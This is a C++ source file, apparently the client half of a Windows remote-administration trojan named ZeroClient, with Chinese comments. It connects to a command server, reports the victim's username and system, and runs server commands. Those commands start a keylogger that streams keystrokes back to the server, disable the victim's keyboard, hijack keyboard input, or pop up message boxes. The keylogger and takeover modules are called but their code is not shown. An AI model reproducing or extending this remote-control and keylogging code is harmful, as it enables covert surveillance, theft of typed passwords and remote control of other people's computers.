#include "zeroclient.h"

std::string KeyboardTakeOver::message = "";



ZeroClient::ZeroClient()
{

}

void ZeroClient::connectTo(std::string domain, int port)
{
    // 连接到服务端
    if (!mSock.connectTo(domain, port)) {
        return;
    }

    // 发送登入命令
    if (!sendLogin()) {
        return;
    }

    // 死循环，不断从服务端接收数据
    const int packetSize = 800;
    char szData[packetSize];
    int ret;

    while (1) {
        ret = mSock.recvData(szData, packetSize);

        // 出现错误
        if (ret == SOCKET_ERROR || ret == 0) {
            // 清空缓冲区
            mBuf.clear();
            break;
        }

        // 把数据加入到缓冲区
        addDataToBuffer(szData, ret);
    }
}

std::string ZeroClient::getUserName()
{
    wchar_t szUser[MAX_PATH];
        DWORD size = MAX_PATH;
        if (GetUserNameW(szUser, &size)) {
            int bufferSize = WideCharToMultiByte(CP_UTF8, 0, szUser, -1, nullptr, 0, nullptr, nullptr);
            if (bufferSize > 0) {
                std::string userName(bufferSize - 1, '\0');
                WideCharToMultiByte(CP_UTF8, 0, szUser, -1, &userName[0], bufferSize, nullptr, nullptr);
                return userName;
            }
        }
        return ""; // 获取失败
}

std::string ZeroClient::getSystemModel()
{
    SYSTEM_INFO info;
    GetSystemInfo(&info);
    OSVERSIONINFOEX os;
    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    std::string osname = "WINDOWS";
    return osname;
}

bool ZeroClient::sendLogin()
{
    // 写好登入信息，然后发送给服务端
    std::string data;
    data.append(CmdLogin+CmdSplit);
    data.append("SYSTEM"+CmdSplit+getSystemModel()+CmdSplit);
    data.append("USER_NAME"+CmdSplit+getUserName());
    data.append(CmdEnd);

    return mSock.sendData(data.data(), data.size());
}

void ZeroClient::addDataToBuffer(char *data, int size)
{
    mBuf.append(data,size);

    // 把数据转换成指令模式
    int endIndex;
    while ((endIndex = mBuf.find(CmdEnd)) >= 0) {
        std::string line = mBuf.substr(0,endIndex);
        mBuf.erase(0, endIndex+CmdEnd.length());

        // 获取指令
        int firstSplit = line.find(CmdSplit);
        std::string cmd = line.substr(0, firstSplit);
        line.erase(0, firstSplit+CmdSplit.length());

        // 处理指令
        processCmd(cmd, line);
    }
}

void ZeroClient::processCmd(std::string &cmd, std::string &data)
{
    std::map<std::string, std::string> args = parseArgs(data);


    // 消息框命令
    if (cmd == CmdSendMessage) {
        doSendMessage(args);
        return;
    }

    // 键盘监控命令
    if (cmd == CmdKeyboardSpy) {
        doKeyboardSpy(args);
        return;
    }

    // 键盘停用命令
    if (cmd == CmdKeyboardStop) {
        doKeyboardStop(args);
        return;
    }

    // 键盘篡改命令
    if (cmd == CmdKeyboardTakeOver) {
        doKeyboardTakeOver(args);
        return;
    }

}

std::map<std::string, std::string> ZeroClient::parseArgs(std::string &data)
{
    // 字符串分割成列表
    std::vector<std::string> v;
    std::string::size_type pos1, pos2;
    pos2 = data.find(CmdSplit);
    pos1 = 0;
    while(std::string::npos != pos2) {
        v.push_back(data.substr(pos1, pos2-pos1));
        pos1 = pos2 + CmdSplit.size();
        pos2 = data.find(CmdSplit, pos1);
    }
    if(pos1 != data.length()) v.push_back(data.substr(pos1));

    // 解析参数
    std::map<std::string, std::string> args;
    for (int i=0; i<(int)v.size()-1; i+=2) {
        args[v.at(i)] =  v.at(i+1);
    }

    return args;
}


void ZeroClient::doKeyboardSpy(std::map<std::string, std::string> &args)
{
    std::cout << "spy" << std::endl;
    std::fflush(stdout);
    // 开始键盘监控
    KeyboardSpy::startKeyboardSpy(mSock.mIp, atoi(args["PORT"].data()));
}

void ZeroClient::doKeyboardStop(std::map<std::string, std::string> &args)
{
    // 开始键盘停用
    KeyboardStop::startKeyboardStop(mSock.mIp, atoi(args["PORT"].data()));
}

void ZeroClient::doKeyboardTakeOver(std::map<std::string, std::string> &args)
{

    std::string message = args["TEXT"].data();

    KeyboardTakeOver::message = message;

    if(message != "stop")
        KeyboardTakeOver::FlagtoTrue();
    else
        KeyboardTakeOver::FlagtoFalse();
    // 开始键盘篡改
    KeyboardTakeOver::startKeyboardTakeOver(mSock.mIp, atoi(args["PORT"].data()));

}

void ZeroClient::doSendMessage(std::map<std::string, std::string> &args)
{
    // 弹出窗口信息
    MessageBoxA(NULL, args["TEXT"].data(), "Message", MB_OK);
    std::string message = args["TEXT"].data();
    std::cout << message << std::endl;
    std::fflush(stdout);

}


